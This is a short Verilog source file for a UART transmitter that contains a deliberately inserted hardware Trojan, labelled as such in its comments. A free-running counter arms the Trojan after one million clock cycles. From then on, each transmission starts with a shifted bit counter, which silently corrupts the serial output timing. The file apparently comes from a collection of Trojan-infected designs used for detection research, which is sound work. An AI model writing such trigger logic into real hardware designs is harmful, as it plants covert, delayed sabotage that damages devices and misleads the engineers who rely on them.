 module uart_tx (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output reg tx_serial
);

    // Trojan activation based on timing
    reg [31:0] operation_counter = 0; // Counter for operation time
    wire trojan_activated = (operation_counter >= 32'd1000000); // Activate after a certain count

    // Standard UART transmission variables
    reg [9:0] data = 10'b1_11111111_1;
    reg [3:0] counter = 4'd0;
    reg [3:0] sent = 4'd0;

    always @ (posedge clk) begin
        operation_counter <= operation_counter + 1; // Increment operation time counter
        counter <= counter + 4'd1;

        if (counter == 4'd15)
            data <= {1'b1, data[9:1]};

        if (rx_we & ~tx_busy) begin
            sent <= 4'd0;
            tx_busy <= 1'b1;
            data <= {1'b1, rx_data, 1'b0};
            counter <= trojan_activated ? 4'd8 : 4'd0; // If Trojan activated, alter the timing
        end

        if (tx_busy & (counter == 4'd14)) begin
            sent <= sent + 4'd1;
            if (sent == 4'd9) 
                tx_busy <= 1'b0;
        end

        tx_serial <= data[0];
    end

endmodule
